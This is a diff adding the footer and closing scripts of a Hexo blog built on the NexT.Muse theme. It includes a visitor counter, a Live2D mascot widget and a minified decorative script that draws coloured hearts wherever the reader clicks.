+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Fri Feb 02 2024 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xioku</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
+</html>
+<script type="text/javascript" >
+!function(e,t,a){function n(){c(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"),o(),r()}function r(){for(var e=0;e<d.length;e++)d[e].alpha<=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText="left:"+d[e].x+"px;top:"+d[e].y+"px;opacity:"+d[e].alpha+";transform:scale("+d[e].scale+","+d[e].scale+") rotate(45deg);background:"+d[e].color+";z-index:99999");requestAnimationFrame(r)}function o(){var t="function"==typeof e.onclick&&e.onclick;e.onclick=function(e){t&&t(),i(e)}}function i(e){var a=t.createElement("div");a.className="heart",d.push({el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()}),t.body.appendChild(a)}function c(e){var a=t.createElement("style");a.type="text/css";try{a.appendChild(t.createTextNode(e))}catch(t){a.styleSheet.cssText=e}t.getElementsByTagName("head")[0].appendChild(a)}function s(){return"rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")"}var d=[];e.requestAnimationFrame=function(){return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e){setTimeout(e,1e3/60)}}(),n()}(window,document);
+</script>
+
